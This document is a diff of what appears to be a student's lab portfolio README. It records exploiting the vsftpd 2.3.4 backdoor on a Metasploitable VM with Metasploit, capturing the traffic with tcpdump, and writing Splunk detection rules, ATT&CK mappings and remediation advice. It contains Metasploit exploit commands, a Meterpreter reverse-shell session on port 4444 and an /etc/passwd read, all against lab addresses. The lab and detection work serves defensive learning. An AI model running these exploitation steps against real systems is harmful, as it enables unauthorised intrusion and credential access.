@@ -140,98 +140,110 @@ Convert to text after attack > tcpdump -r ~/full_killchain.pcap -nn -tttt > ~/ki
 
 # Output
 
+`full_killchain.pcap` — 4,069 packets captured, 1.6MB. Converted to `killchain_capture.txt` (589KB) and uploaded to Splunk for analysis.
 
 **Findings:**
-1
+
+The full attack chain was captured in a single pcap file. Having an unbroken packet capture from start to finish is critical for incident response — it preserves evidence of every connection, payload, and response that occurred during the attack
 
 ### 2. Identify each attack stage in the packet capture.
-[]
 
-# Command used
-[]
+SPL queries were run in Splunk against the ingested capture to identify and confirm each stage of the kill chain in the traffic data.
+
+# Splunk commands used
+
+Stage 1 — Recon detection (port scan signature)
+
+index=main source="killchain_capture.txt" | rex field=_raw “(?<src_ip>\d+.\d+.\d+.\d+)” | stats count by src_ip | sort -count
+
+Stage 2 — Backdoor exploitation (port 6200)
+
+index=main source="killchain_capture.txt" “6200”
+
+Stage 3 — Meterpreter C2 (port 4444)
+
+index=main source="killchain_capture.txt" “4444”
 
 
 # Output
 
+- **Recon:** Kali (192.168.79.129) generated 2,829 events vs. Metasploitable's 1,484 — high-volume outbound traffic from one source is a reliable port scan indicator
+- **Port 6200:** 27 events — bidirectional traffic confirming the vsftpd backdoor was triggered and active
+- **Port 4444:** Multiple pages of sustained bidirectional traffic between Kali:4444 and Metasploitable:46275 — confirms the Meterpreter reverse shell session was established and maintained
 
 
 **Findings:**
-0
+
+Every stage of the attack left a distinct and detectable footprint in the packet capture. Recon, exploitation, and command & control were all visible through targeted SPL queries.
+
 ### 3. Write a Splunk detection rule for each stage.
-[] 
+
+Each attack stage was documented as a reusable Splunk detection query that a SOC analyst could run or schedule as an alert.
 
 
-# Command used
+# Rules/Commands used
 []
-# Output
 
-2
+**Rule 1 — Port Scan Detection (Recon):**
+
+index=main | rex field=_raw “(?<src_ip>\d+.\d+.\d+.\d+)” | stats count by src_ip | sort -count | where count > 500
+
+Flags any single source IP generating more than 500 events — characteristic of automated port scanning.
+
+**Rule 2 — vsftpd Backdoor (Port 6200):**
+
+index=main “6200” | stats count by src_ip
+
+Any traffic on port 6200 is anomalous and should be treated as a potential vsftpd backdoor trigger.
+
+**Rule 3 — Reverse Shell Callback (Port 4444):**
+
+index=main “4444” | stats count by src_ip | sort -count
+
+Port 4444 is Metasploit's default Meterpreter listener port. Outbound connections to or from this port indicate potential reverse shell activity.
+
 ```
 
 **Findings:**
 
-
+In a production environment, these queries would be saved as scheduled Splunk alerts firing every 5–15 minutes. Any hit on port 6200 or sustained traffic on port 4444 should trigger immediate investigation.
 
 
 
 ### 4. [Map each stage to ATT&CK tactic and NIST IR phase.]
 
 
-#Command
-[]
-
 # Output
-.
+
+| Attack Stage | MITRE ATT&CK Tactic | Technique ID | NIST IR Phase |
+|---|---|---|---|
+
+| Nmap service scan | Reconnaissance | T1046 — Network Service Discovery | Detection & Analysis |
+| NSE backdoor confirmation | Reconnaissance | T1595 — Active Scanning | Detection & Analysis |
+| vsftpd exploitation | Initial Access | T1190 — Exploit Public-Facing Application | Detection & Analysis |
+| Meterpreter session | Command & Control | T1571 — Non-Standard Port | Containment |
+| Post-exploitation enumeration | Discovery | T1082 — System Information Discovery | Containment |
+| /etc/passwd access | Credential Access | T1003 — OS Credential Dumping | Eradication |
 
 
 
 **Findings:** 
 
-Port / Service / Vulnerability / NSE Script / Severity / Notes
+The kill chain maps cleanly across the MITRE ATT&CK framework from Reconnaissance through Credential Access. Each stage aligns with a NIST IR phase — Detection & Analysis covers recon and exploitation, while Containment and Eradication cover the post-exploitation actions that would need to be addressed in a real incident response.
 
-21/tcp (FTP) - ftp-vsftpd-backdoor (CVE-2011-2523)	🔴 Critical	Live exploitation confirmed. The vulnerable vsFTPd 2.3.4 backdoor allowed remote command execution and root shell access. (CVSS 9.8)
-
-22/tcp (SSH) - Weak SSH cryptographic configuration - 🟡 Medium	Weak or outdated cryptographic algorithms were identified, potentially reducing the security of encrypted communications.
-
-23/tcp (Telnet) - Telnet service detected	🟠 High	Telnet transmits credentials in plaintext, making usernames and passwords susceptible to interception.
-
-80/tcp (HTTP) - Slowloris Denial-of-Service	🟡 Medium	The web server appears susceptible to the Slowloris DoS attack, which can exhaust server connections and deny service to legitimate users.
-
-80/tcp (HTTP) - HTTP TRACE method enabled	🟢 Low	TRACE is enabled, which may aid reconnaissance or cross-site tracing attacks but does not directly compromise the server.
-
-80/tcp (HTTP) - SQL Injection vulnerability	🟠 High	SQL injection was detected and could allow attackers to retrieve, modify, or delete database information.
-
-111/tcp (rpcbind) - RPC information disclosure	🟢 Low	rpcbind exposes information about available RPC services, assisting attacker reconnaissance.
-
-139/tcp (NetBIOS/SMB) - SMB enumeration	🟡 Medium	SMB information disclosure allows attackers to gather host and share information useful for later attacks.
-
-445/tcp (SMB) - smb-vuln-ms10-061 🟢 Not Vulnerable	NSE script returned false, indicating the system is not vulnerable to MS10-061.
-
-445/tcp (SMB) - smb-vuln-ms10-054 🟢 Not Vulnerable	NSE script returned false, indicating the target is not affected by MS10-054.
-
-445/tcp (SMB) - smb-vuln-regsvc-dos	⚪ Inconclusive	The script failed to complete successfully, so the vulnerability status could not be determined.
-
-3306/tcp (MySQL) - MySQL information disclosure	🟡 Medium	Database version and service information were exposed, which may help attackers identify known exploits.
-
-443/tcp (HTTPS) - Logjam (Weak Diffie-Hellman Parameters) 🟡 Medium	Weak Diffie-Hellman parameters reduce TLS security and could allow encrypted communications to be weakened under certain attack scenarios
-
-**Findings:** 
-
-The table above consolidates all of the findings reported during the Nmap --script vuln scan and categorizes each result by severity. The most significant finding was the vsFTPd 2.3.4 backdoor (CVE-2011-2523) on port 21, which was successfully exploited to obtain root-level access, making it the only Critical vulnerability confirmed through live exploitation. Several additional weaknesses were identified, including SQL injection, Telnet running without encryption, Slowloris denial-of-service susceptibility, and weak SSH cryptographic settings, all of which increase the attack surface of the target system. The SMB vulnerability checks also demonstrated that vulnerability scans can produce different outcomes: some scripts confirmed the system was not vulnerable, while others returned inconclusive results because the checks could not be completed. Overall, the scan illustrates the importance of reviewing every NSE script result individually, as findings may represent confirmed vulnerabilities, informational issues, successful mitigations, or inconclusive tests requiring additional investigation.
+**FINAL FINDINGS**
 
 ---
 
+
 ## 📊 Key Findings Summary
 
-| Port/Service | Tool Used | Risk Level | Notes |
-
-| 21/tcp FTP | Nmap (`vuln`, `ftp-anon`) | 🔴 Critical | vsFTPd 2.3.4 backdoor (CVE-2011-2523) — live exploitation confirmed, root access achieved |
-| 23/tcp Telnet | Nmap (`vuln`) | 🟠 High | Transmits credentials in plaintext, vulnerable to interception |
-| 80/tcp HTTP | Nmap (`vuln`) | 🟠 High | SQL injection vulnerability detected |
-| 80/tcp HTTP | Nmap (`vuln`) | 🟡 Medium | Susceptible to Slowloris denial-of-service attack |
-| 445/tcp SMB | Nmap (`-sC`, `smb-vuln*`) | 🟡 Medium | Message signing disabled; guest authentication allowed |
-| 22/tcp SSH | Nmap (`vuln`) | 🟡 Medium | Weak/outdated cryptographic configuration identified |
-| 3306/tcp MySQL | Nmap (`vuln`) | 🟡 Medium | Database version and service info exposed |
+| Attack Stage | Port/Protocol | Detection Method | Risk Level |
+|---|---|---|---|
+| Port scan (recon) | All ports / TCP | Splunk — high event volume from single src_ip | 🟠 High |
+| vsftpd backdoor triggered | 6200/TCP | Splunk — port 6200 traffic | 🔴 Critical |
+| Meterpreter reverse shell | 4444/TCP | Splunk — sustained port 4444 C2 traffic | 🔴 Critical |
+| Root shell / post-exploitation | N/A | TCPDump capture evidence | 🔴 Critical |
 
 **Risk Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low
 
@@ -242,77 +254,50 @@ The table above consolidates all of the findings reported during the Nmap --scri
 
 | Action Performed | ATT&CK Tactic | Technique ID | Technique Name |
 |---|---|---|---|
-| Default and targeted script scanning (-sC, ftp-anon, smb-vuln*) | Reconnaissance | T1595 | Active Scanning |
-| Anonymous FTP login confirmed | Initial Access | T1078 | Valid Accounts |
-| vsFTPd backdoor exploitation (root shell via `id` command) | Execution | T1059 | Command and Scripting Interpreter |
-| Root-level access confirmed post-exploitation | Privilege Escalation | T1068 | Exploitation for Privilege Escalation |
-
+| Nmap service version scan | Reconnaissance | T1046 | Network Service Discovery |
+| NSE ftp-vsftpd-backdoor script | Reconnaissance | T1595 | Active Scanning |
+| vsftpd 2.3.4 backdoor exploit | Initial Access | T1190 | Exploit Public-Facing Application |
+| Meterpreter reverse shell (port 4444) | Command & Control | T1571 | Non-Standard Port |
+| whoami / id / uname -a | Discovery | T1082 | System Information Discovery |
+| cat /etc/passwd | Credential Access | T1003 | OS Credential Dumping |
 ---
 
 ## 🛡️ Defensive Recommendations
 
-Based on findings, the following remediations would be recommended in a real environment:
-
-1. **vsFTPd 2.3.4 backdoor (Critical)** — Immediately upgrade or replace the FTP service; this version is known to contain an intentional backdoor and should never be used in production.
-2. **Anonymous FTP login allowed** — Disable anonymous access entirely; require authenticated accounts for any FTP access.
-3. **Telnet enabled (plaintext credentials)** — Disable Telnet and replace with SSH for all remote administration.
-4. **SMB message signing disabled** — Enable SMB message signing to prevent tampering and man-in-the-middle attacks on SMB traffic.
-5. **SQL injection on port 80** — Implement input validation/parameterized queries on the web application, and consider a WAF as an additional layer of defense.
-
+1. **Remove vsftpd 2.3.4 immediately (Critical)** — This version contains an intentional backdoor and must never run in any environment. Replace with a current, maintained FTP server or eliminate FTP entirely in favor of SFTP.
+2. **Block outbound connections on non-standard ports** — Egress filtering on port 4444 would have terminated the Meterpreter session before it was established. Restrict outbound traffic to only required ports (80, 443, 22).
+3. **Alert on port 6200 traffic** — Port 6200 has no legitimate use in most environments. Any traffic to or from this port should trigger an immediate alert in the SIEM.
+4. **Deploy network-based IDS/IPS** — A properly configured Snort or Suricata rule for the vsftpd backdoor pattern would have detected and blocked the exploitation attempt in real time.
+5. **Implement SIEM alerting for high-volume scans** — A single IP generating hundreds of connection attempts in a short timeframe is a reliable recon indicator. Automated alerts for this pattern reduce time-to-detection significantly.
 ---
 
-## 📚 CySA+ Exam Relevance
-
-This lab directly maps to the following CompTIA CySA+ (CS0-003) exam domains:
-
-| Domain | Coverage |
-
-| Security Operations (33%) | Hands-on use of Nmap and NSE scripts to perform reconnaissance and identify live services and misconfigurations |
-| Vulnerability Management (30%) | Running vulnerability-check scripts (`smb-vuln*`, `vuln`), interpreting results, and cross-referencing CVE/CVSS data from NVD |
-| Incident Response (20%) | Recognizing confirmed exploitation (root access via vsFTPd backdoor) as evidence of active compromise |
-| Reporting & Communication (17%) | Documenting findings by severity in a structured, readable format for technical and non-technical audiences |
 
 ---
 
 ## 🔑 Technical Notes
 
-> # Note: not all NSE vulnerability scripts behave the same way — most only detect and report (true/false), while a small number (like ftp-vsftpd-backdoor) actually attempt live exploitation. Always check script documentation or output carefully rather than assuming uniform behavior.
->
-> "Always add the -n flag to Nmap scans in this VMware environment to prevent DNS resolution hangs."]
-> 
-> -sP and -sT contradict eachother (Can't be used together because -sP means just do a ping/host-discovery sweep, skip ports entirely but -sT tells Nmap to do a full TCP connect port scan. These commands contradict eachother.)
+## 🔑 Technical Notes
 
 ```bash
+# Capture traffic during the full attack session
+sudo tcpdump -i eth0 -w ~/full_killchain.pcap
 
-# Any important commands or workarounds
-[-sC]
-[-Pn]
+# Convert pcap to text for Splunk ingestion
+tcpdump -r ~/full_killchain.pcap -nn -tttt > ~/killchain_capture.txt
 
-# Any important commands or workarounds
+# NSE confirmation scan before Metasploit
+sudo nmap -sV --script=ftp-vsftpd-backdoor -Pn --disable-arp-ping -n -p 21 192.168.79.130
 
-# Task 1: Run default scripts (-sC) against key ports
-sudo nmap -sC -Pn --disable-arp-ping -n -p 21,22,80,445 192.168.79.130
+# Metasploit exploitation
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.79.130
+set LHOST 192.168.79.129
+run
+```
 
-# Task 2: Check FTP for anonymous login specifically
-sudo nmap --script ftp-anon -Pn --disable-arp-ping -n -p 21 192.168.79.130
+> Always use `-Pn --disable-arp-ping -n` with Nmap in this VMware Host-Only environment to prevent ARP ping timeouts and DNS resolution hangs.
 
-# Task 3: Run all SMB vulnerability scripts against port 445
-sudo nmap --script smb-vuln* -Pn --disable-arp-ping -n -p 445 192.168.79.130
-
-# Task 4: Run the full vuln script category across all open ports
-sudo nmap --script vuln -Pn --disable-arp-ping -n 192.168.79.130
-
-# Workaround: -p requires a value directly after it — omitting the port number
-# (e.g. "-p 192.168.79.130") causes Nmap to misinterpret the target IP as a
-# port specification. To scan all ports instead of a specific one, remove
-# the -p flag entirely rather than leaving it empty.
-
-# Workaround: always use -n in this lab to prevent DNS resolution hangs,
-# since the isolated Host-Only network has no real DNS server.
-
-# Note: --script <name>* (wildcard) runs every NSE script matching that
-# name pattern — useful for running a whole category (e.g. smb-vuln*)
-# in a single command instead of specifying each script individually.
+> TCPDump saves with a `~` tilde appended to the filename when stopped mid-write. Rename with `mv ~/full_killchain.pcap~ ~/full_killchain.pcap` before converting.
 ```
 
 ---
@@ -321,18 +306,15 @@ sudo nmap --script vuln -Pn --disable-arp-ping -n 192.168.79.130
 
 [1-2 sentences about how this fits into your overall portfolio and career goals.]
 
-This repository is part of my broader cybersecurity portfolio demonstrating practical, hands-on vulnerability assessment skills from initial scanning through confirmed exploitation as I work toward a career as a cybersecurity analyst.
-
-This repository is important because here we have built up to the point of having live proof of the actual exploitation by an automated Nmap script for the CVE-2011-2523. In a past NVD task I researched this exact vulnerability with a CVSS score of 9.8 now this has come full circle and we found out how this exact vulnerability is exploited and root access was acheived. 
+This repository is part of my broader cybersecurity portfolio demonstrating practical, hands-on skills across the full attack lifecycle — from reconnaissance through exploitation and into Blue Team detection. This lab is the culmination of the prior labs in this series: the vsftpd 2.3.4 backdoor was first researched by CVE in the NVD lab, confirmed vulnerable via NSE script in the scanning lab, and is now fully exploited and detected end-to-end here.
 
 
 **Related repositories:**
-- Nmap-Host-Discovery-and-Lab-Baseline — Established a baseline of the lab network using ping sweeps and host discovery, documenting the target environment before deeper scanning began
-- Nmap-Scan-Types-SYN-vs-TCP-vs-UDP — Compared SYN, TCP connect, and UDP scan types against the target, examining differences in speed, stealth, and reliability
-- Service-Version-Detection-and-OS-Fingerprinting — Identified exact software versions on Metasploitable and researched real CVEs tied to them, including the vsFTPd backdoor later exploited in this repository
-- Wireshark-Capture-and-Analyze-Traffic — Captured and analyzed live packet traffic, including plaintext credential exposure over Telnet
-- TCPDump-CLI-Packet-Capture — Used TCPDump from the command line to capture traffic (including a live Telnet session showing plaintext credential exposure), and demonstrated saving captures to a `.pcap` file for later analysis in Wireshark
-
+- Nmap-Host-Discovery-and-Lab-Baseline — Established a baseline of the lab network using ping sweeps and host discovery
+- Nmap-Scan-Types-SYN-vs-TCP-vs-UDP — Compared SYN, TCP connect, and UDP scan types
+- Service-Version-Detection-and-OS-Fingerprinting — Identified software versions and researched CVEs including the vsFTPd backdoor
+- Wireshark-Capture-and-Analyze-Traffic — Captured and analyzed live packet traffic including plaintext credential exposure
+- TCPDump-CLI-Packet-Capture — Command-line packet capture and pcap file analysis
 ---
 
 ## 👤 Author
